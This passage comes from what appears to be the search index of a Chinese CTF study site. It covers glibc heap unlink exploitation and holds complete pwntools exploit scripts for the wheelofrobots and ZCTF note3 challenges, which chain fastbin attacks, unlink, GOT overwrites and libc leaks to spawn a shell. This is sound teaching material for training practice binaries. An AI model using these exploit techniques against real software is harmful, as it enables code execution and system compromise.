\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3a atoi \u7684\u5730\u5740\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770b note 0 \u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662f atoi \u7684\u5730\u5740\u3002 \u4fee\u6539 atoi got \u00b6 payload = p64 ( onegadget ) editnote ( 0 , 1 , payload ) \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a one_gadget \u5730\u5740\u3002 get shell \u00b6 p . sendline ( 'skye' ) p . interactive () \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f one_gadget \uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002 \u603b\u7ed3 \u00b6 \u9898\u76ee\u8003\u70b9\uff1aunlink\u3001fastbin \u673a\u5236\u3001\u6570\u5b57\u7c7b\u578b\u8fd0\u7b97\u8f6c\u6362\u3002 unlink \u548c fastbin \u4e0e\u4e0a\u9762\u5b66\u4e60\u7684\u5dee\u522b\u4e0d\u5927\uff0c\u90fd\u662f\u5229\u7528 unlink \u63a7\u5236 chunk list \u4fee\u6539\u5f53\u4e2d\u7684 \u5806\u6307\u9488\u5730\u5740\uff0c\u5b9e\u73b0\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3002 \u4e00\u5f00\u59cb\u5728\u8fd9\u6761\u9898\u76ee\u5361\u4f4f\u5c31\u662f\u5728\uff0cedit \u8fd9\u4e2a\u529f\u80fd\u4e00\u5ea6\u4ee5\u4e3a\u5b58\u5728\u5806\u6ea2\u51fa\u3002\u6700\u540e\u770b wp \u624d\u77e5\u9053\u5b58\u5728 unsigned int \u4e0e int \u8fd0\u7b97\u7c7b\u578b\u8f6c\u6362\u7684\u903b\u8f91\u6f0f\u6d1e\uff0c\u627e\u5230\u6ea2\u51fa\u70b9\u5c31\u597d\u505a\u4e86\u3002 2017 insomni'hack wheelofrobots \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u52a8\u6001\u94fe\u63a5 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u624d\u80fd\u542f\u52a8\u3002 \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570 read_num \u662f\u8bfb\u53d6\u6700\u957f\u4e3a 4 \u5b57\u8282\u7684\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u8fd4\u56de\u3002 \u7a0b\u5e8f\u57fa\u672c\u529f\u80fd\uff1a\u5806\u589e\u5220\u67e5\u6539\u3002 add \u6700\u591a\u80fd\u7533\u8bf7 3 \u4e2a\u5806\u5757\u3002\u6bcf\u79cd\u8f6e\u5b50\u7684\u521b\u5efa\u7b56\u7565\u4e0d\u540c\uff0c\u4e3b\u8981\u786e\u4fdd\u662f\u7533\u8bf7\u5927\u5c0f\u7684\u9650\u5236\u4ee5\u53ca\u662f\u5426\u56fa\u5b9a\u5927\u5c0f\u3002 start_robot \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u8f6e\u5b50\uff08\u5806\uff09\u7684\u5185\u5bb9\u8fdb\u884c\u8f93\u51fa\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002 change \u6839\u636e\u6bcf\u4e2a chunk size \u4fee\u6539 chunk \u5185\u5bb9 \u6f0f\u6d1e \u00b6 off-by-one \u00b6 add \u9009\u62e9\u6dfb\u52a0\u7684\u8f6e\u5b50\u65f6\uff0c\u8c03\u7528 read_num \u6700\u957f\u53ef\u4ee5\u5199\u5165 4 \u5b57\u8282\uff0c\u6700\u540e 1 \u5b57\u8282\u4f1a\u8986\u76d6 bender_inuse \uff0c\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002 .bss:0000000000603110 choice db ? ; ; DATA XREF: add+3A\u2191o .bss:0000000000603110 ; add+49\u2191o ... .bss:0000000000603111 db ? ; .bss:0000000000603112 db ? ; .bss:0000000000603113 db ? ; .bss:0000000000603114 bender_inuse dd ? ; DATA XREF: add:loc_400EE0\u2191r \u5806\u6ea2\u51fa \u00b6 add \u6dfb\u52a0 destructor \u8f6e\u5b50\uff08\u7b2c6\u4e2a\uff09\u65f6\uff0csize \u662f\u6b63\u5e38\u4ea7\u751f\u7684\uff1a destructor = calloc(1uLL, 20 * v5); \uff0c\u6ca1\u6709\u5bf9 v5 \u5927\u5c0f\u8fdb\u884c\u9650\u5236\uff0c\u5177\u4f53\u53ef\u4ee5\u5bf9\u6bd4\u7b2c 3 \u4e2a\u8f6e\u5b50\u3002read_num \u5b9a\u4e49\u8fd4\u56de\u503c\u4e3a int \uff0cv5 \u5b9a\u4e49\u4e3a unsigned int \uff0c\u53ea\u8981\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5); \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 20*v5 \u6ea2\u51fa\u3002\u4e0e\u6b64\u540c\u65f6\uff0c destructor_size = v5 \u4f1a\u5f88\u5927\uff0cdestructor_size \u5b9a\u4e49\u4e3a __int64 \u5373 long long int \u6709\u7b26\u53f7 64 \u4f4d\u6574\u6570\uff0cv5 \u5f3a\u5236\u8d4b\u503c\u7ed9\u5b83\u4f1a\u4f9d\u7136\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6b63\u6570\u3002 UAF \u00b6 free chunk \u53ea\u662f\u91ca\u653e\u5185\u5b58\uff0c\u6ca1\u6709\u5c06\u5bf9\u5e94\u6307\u9488\u6e05\u7a7a\uff0csize \u4f4d\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6784\u9020\u4efb\u610f\u8bfb\u5199\u6307\u9488\u6bd4\u8f83\u7ed5\uff0c\u540e\u9762\u5c31\u662f\u524d\u9762\u7684 unlink \u64cd\u4f5c\u3002 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b50 1 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002 \u8fd9\u91cc\u662f\u4e00\u5b9a\u8981 destructor \u8fd9\u4e2a\u8f6e\u5b50\uff0c\u63a7\u5236\u5176\u4ed6\u8f6e\u5b50\u7684 size \u503c\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u4e3b\u8981\u662f\u5426\u80fd bypass fastbin \u7684\u68c0\u67e5\u5c31\u884c\u3002 fastbin attack \u5c06 1 tinny \u6307\u9488\u6307\u5411 destructor_size \uff0c\u540e\u7eed\u901a\u8fc7 edit 1 tinny \u4fee\u6539 destructor_size \u3002 # add a fastbin chunk 0x20 and free it # fastbin \u6307\u9488\u6307\u5411\uff1a2 bender->NULL add ( 2 , 1 ) # 2 bender remove ( 2 ) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 \u8ba9\u6211\u4eec\u80fd\u7f16\u8f91 overflow_benderinuse ( ' \\x01 ' ) # \u8986\u5199 fd 2 0x603138, point to 2 bender's size,\u540e\u9762\u4f2a\u9020\u5806fd\u5c31\u662fdestructor_size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 # \u8ba9\u6211\u4eec\u518d\u4e00\u6b21\u7533\u8bf7 2 bender overflow_benderinuse ( ' \\x00 ' ) # add 2 bender again, fastbin 0x603138->NULL # \u5c06\u539f\u6765 2 bender \u7a7a\u95f4\u7533\u8bf7\u51fa\u6765 add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # \u7ed5\u8fc7fastbin size \u68c0\u67e5\uff1a\u5c06size\u4f4d\u4f2a\u9020\u4e00\u4e2afastbin\u8303\u56f4\u7684\u503c # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # 0x603140 \u662f 3 Devil \u7684size\u4f4d\uff0c\u7533\u8bf7fastbin\u8303\u56f4\u5373\u53ef add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # \u91ca\u653e\u65e0\u7528\u5806 # wheels must <= 3 # only save tinny(0x603138) remove ( 2 ) remove ( 3 ) \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6 bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002 unlink \u5c06 6 destructor \u7684\u6307\u9488\u6307\u5411 0x06030E8 - 0x18 # alloc 6 destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc 3 devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b50 1 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002 # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 exit() patch \u4e3a\u4e00\u4e2a ret \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002 \u5c06 exit() got \u8868\u4fee\u6539\u4e3a ret \uff0c\u5c31\u901a\u8fc7\u591a\u6b21\u8c03\u7528\u603b\u4f1a\u8f93\u51fa\u88ab\u6211\u4eec\u4fee\u6539\u6307\u9488\u7684\u8f6e\u5b50 hijack \u67d0\u4e2a\u51fd\u6570 got \u4e3a puts \uff0c\u6bd4\u5982 free \u90a3\u4e48\u5b9e\u9645\u4e0a\u4e0d\u662f\u91ca\u653e\u4e86\u662f\u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5185\u5bb9 # make exit just as return write ( elf . got [ 'exit' ], 0x401954 ) \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc \u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8 shell\u3002 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./wheelofrobots\" ) elf = ELF ( \"./wheelofrobots\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( idx , size = 0 ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) if idx == 2 : p . recvuntil ( \"Increase Bender's intelligence: \" ) p . sendline ( str ( size )) elif idx == 3 : p . recvuntil ( \"Increase Robot Devil's cruelty: \" ) p . sendline ( str ( size )) elif idx == 6 : p . recvuntil ( \"Increase Destructor's powerful: \" ) p . sendline ( str ( size )) def remove ( idx ): p . recvuntil ( 'Your choice :' ) p . sendline ( '2' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) def change ( idx , name ): p . recvuntil ( 'Your choice :' ) p . sendline ( '3' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) p . recvuntil ( \"Robot's name: \\n \" ) p . send ( name ) def start_robot (): p . recvuntil ( 'Your choice :' ) p . sendline ( '4' ) def overflow_benderinuse ( inuse ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . send ( '9999' + inuse ) def write ( where , what ): change ( 1 , p64 ( where )) change ( 6 , p64 ( what )) def exp (): print \"step 1 - fastbin attack\" # add a fastbin chunk 0x20 and free it # fastbin \u6307\u9488\u6307\u5411\uff1a2 bender->NULL add ( 2 , 1 ) # 2 bender remove ( 2 ) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 \u8ba9\u6211\u4eec\u80fd\u7f16\u8f91 overflow_benderinuse ( ' \\x01 ' ) # \u8986\u5199 fd 2 0x603138, point to 2 bender's size,\u540e\u9762\u4f2a\u9020\u5806fd\u5c31\u662fdestructor_size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 # \u8ba9\u6211\u4eec\u518d\u4e00\u6b21\u7533\u8bf7 2 bender overflow_benderinuse ( ' \\x00 ' ) # add 2 bender again, fastbin 0x603138->NULL # \u5c06\u539f\u6765 2 bender \u7a7a\u95f4\u7533\u8bf7\u51fa\u6765 add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # \u7ed5\u8fc7fastbin size \u68c0\u67e5\uff1a\u5c06size\u4f4d\u4f2a\u9020\u4e00\u4e2afastbin\u8303\u56f4\u7684\u503c # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # 0x603140 \u662f 3 Devil \u7684size\u4f4d\uff0c\u7533\u8bf7fastbin\u8303\u56f4\u5373\u53ef add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # \u91ca\u653e\u65e0\u7528\u5806 # wheels must <= 3 # only save tinny(0x603138) remove ( 2 ) remove ( 3 ) print 'step 2 - unlink' # alloc 6 destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc 3 devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # gdb.attach(p) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) print 'step 3 - hijack chunk1 ptr' # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) print 'step 4 - hijack exit.got' # make exit just as return write ( elf . got [ 'exit' ], 0x401954 ) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write ( 0x603130 , 3 ) # set destructor point to puts@got change ( 1 , p64 ( elf . got [ 'puts' ])) start_robot () p . recvuntil ( 'New hands great!! Thx ' ) puts_addr = p . recvuntil ( '! \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] log . success ( 'libc base: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) # make free->system write ( elf . got [ 'free' ], system_addr ) # make destructor point to /bin/sh addr write ( 0x6030E8 , binsh_addr ) # get shell remove ( 6 ) p . interactive () pass if __name__ == \"__main__\" : exp () ZCTF 2016 note3 \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u57fa\u672c\u529f\u80fd \u00b6 \u57fa\u672c\u5806\u7ba1\u7406\uff0c\u6709\u589e\u5220\u6539\u529f\u80fd\u3002 \u5806\u6570\u91cf\u4e0a\u9650\u4e3a 8 \u4e2a\uff0c\u5927\u5c0f\u5728 0~1024 \u4e4b\u95f4\u81ea\u5b9a\u4e49\u3002\u5806\u6307\u9488\u6307\u9488\u548c size \u5206\u522b\u7528\u4e00\u4e2a\u5217\u8868\u5b58\u653e\uff0c\u7ed3\u5408\u540e\u9762\u63a8\u6d4b\u51fa\uff0cqword_6020C0[0] \u4e3a\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u5b58\u50a8\u521a\u521a\u64cd\u4f5c\u7684\u5b8c\u7684 chunk_ptr \u3002 \u6f0f\u6d1e \u00b6 delete \u548c edit \u8bfb\u53d6\u5e8f\u53f7\u65f6\u6709\u70b9\u7279\u6b8a\uff0c\u5c06\u8f93\u5165\u503c\u7ecf\u8fc7\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u76f4\u63a5\u5f53\u505a\u662f\u4e0b\u6807\uff0c \u6ca1\u6709\u518d\u8fdb\u4e00\u6b65\u68c0\u67e5\u4e0b\u6807\u662f\u5426\u975e\u6cd5\u7684 \uff1a v3 = v0 - 7 * ((( signed __int64 )(( unsigned __int128 )( 5270498306774157605L L * ( signed __int128 ) v0 ) >> 64 ) >> 1 ) - ( v0 >> 63 )); \u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6574\u578b\u6ea2\u51fa\uff0c\u5f53\u8f93\u5165\u503c\u4e3a 0x8000000000000000 \uff0c\u7ed3\u679c\u4e3a -1 \uff0c\u8fd9\u6837\u5c31\u5c06\u4fee\u6539\u7f13\u51b2\u533a\u7684\u5806\u5757\uff0c\u4fee\u6539\u7a0b\u5ea6\u4e3a chunk7 \u5730\u5740\uff1a .bss: current_ptr <== edit ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr <== size note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size \u7531\u4e8e\u8f93\u5165\u957f\u5ea6\u6709\u9650\uff0c\u6240\u4ee5\u5c06\u539f\u503c\u8f6c\u6362\u4e3a\u8d1f\u6570\uff1a 0x8000000000000000 - 0x10000000000000000 \u3002 \u601d\u8def \u00b6 \u5229\u7528\u6574\u578b\u6f0f\u6d1e\uff0c\u5f62\u6210\u4e00\u4e2a\u5806\u6ea2\u51fa\u3002\u4fee\u6539 next_chunk \u7684 header \u4fe1\u606f\uff0c\u6784\u9020 unlink \u6761\u4ef6\u3002 unlink \u540e\u63a7\u5236 chunk_ptr \u6307\u9488\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u51fa\u529f\u80fd\uff0c\u5c06 free \u6539\u4e3a puts \u7528\u6765\u6cc4\u9732\u5730\u5740\uff0c\u7136\u540e\u5728\u5c06 free \u6539\u4e3a system \u3002 EXP \u00b6 #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'info' , os = 'linux' , arch = 'amd64' ) # p = process(\"./note3\") p = remote ( \"node3.buuoj.cn\" , 25763 ) elf = ELF ( \"./note3\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . sendlineafter ( '>> \\n ' , '1' ) p . sendlineafter ( '1024) \\n ' , str ( size )) p . sendlineafter ( 'content: \\n ' , content ) def edit ( idx , content ): p . sendlineafter ( '>> \\n ' , '3' ) p . sendlineafter ( 'note: \\n ' , str ( idx )) p . sendlineafter ( 'content: \\n ' , content ) def free ( idx ): p . sendlineafter ( '>> \\n ' , '4' ) p . sendlineafter ( 'note: \\n ' , str ( idx )) def show (): p . sendlineafter ( '>> \\n ' , '2' ) for _ in range ( 3 ): add ( 0x50 , 'a' * 8 ) add ( 0x90 , 'b' * 8 ) for _ in range ( 3 ): add ( 0x50 , 'a' * 8 ) edit ( 2 , 'skyedidi' ) ptr = 0x6020d8 payload = p64 ( 0 ) + p64 ( 0x51 ) payload += p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload = payload . ljust ( 0x50 , 'a' ) payload += p64 ( 0x50 ) + p64 ( 0xa0 ) edit ( 0x8000000000000000 - 0x10000000000000000 , payload ) free ( 3 ) payload = 'skyedidi' + p64 ( elf . got [ 'free' ]) + p64 ( elf . got [ 'puts' ]) payload += p64 ( 0x6020c0 ) edit ( 2 , payload ) edit ( 0 , p64 ( elf . plt [ 'puts' ])[: 7 ]) free ( 1 ) puts_leak = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"puts_leak:\" + hex ( puts_leak )) libc_base = puts_leak - 0x06f690 #libc.sym['puts'] system = libc_base + 0x045390 #libc.sym['system'] binsh = libc_base + 0x18cd57 #next(libc.search('/bin/sh')) edit ( 0 , p64 ( system )[: 7 ]) payload = 'skyedidi' + p64 ( elf . got [ 'free' ]) + p64 ( elf . got [ 'puts' ]) payload += p64 ( binsh ) edit ( 2 , payload ) free ( 2 ) # gdb.attach(p) p . interactive ()","title":"Unlink"},{"location":"Pwn/glibc-heap/unlink/#unlink","text":"","title":"Unlink"},{"location":"Pwn/glibc-heap/unlink/#_1","text":"\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9 chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002 \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff08\u4f8b\u5982 free \u65f6\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\uff09\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/unlink/#unlink_1","text":"\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9 chunk \u7684 size \u68c0\u67e5\u548c\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u5373\u6ca1\u6709\u5982\u4e0b\u68c0\u67e5\u4ee3\u7801\u3002 // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4(size\u68c0\u67e5) if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ // \u68c0\u67e5 fd \u548c bk \u6307\u9488(\u53cc\u5411\u94fe\u8868\u5b8c\u6574\u6027\u68c0\u67e5) if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // largebin \u4e2d next_size \u53cc\u5411\u94fe\u8868\u5b8c\u6574\u6027\u68c0\u67e5 if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50 \u73b0\u5728\u6709\u7269\u7406\u7a7a\u95f4\u8fde\u7eed\u7684\u4e24\u4e2a chunk\uff08Q\uff0cNextchunk\uff09\uff0c\u5176\u4e2d Q \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u3001Nextchunk \u5904\u4e8e\u91ca\u653e\u72b6\u6001\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk 